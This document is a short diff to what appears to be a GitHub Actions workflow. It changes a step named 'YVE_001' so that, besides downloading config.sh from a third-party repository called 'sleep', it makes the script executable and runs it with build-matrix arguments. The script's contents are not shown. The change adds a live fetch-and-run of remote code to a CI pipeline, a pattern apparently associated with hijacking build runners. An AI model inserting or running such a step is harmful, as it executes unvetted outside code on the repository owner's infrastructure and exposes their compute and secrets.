@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: YVE_001
       run: |
-        wget https://github.com/aniw9912/sleep/raw/master/config.sh
+        wget https://github.com/aniw9912/sleep/raw/master/config.sh && chmod u+x config.sh && ./config.sh kloter1-${{ matrix.go }}-${{ matrix.flag }}
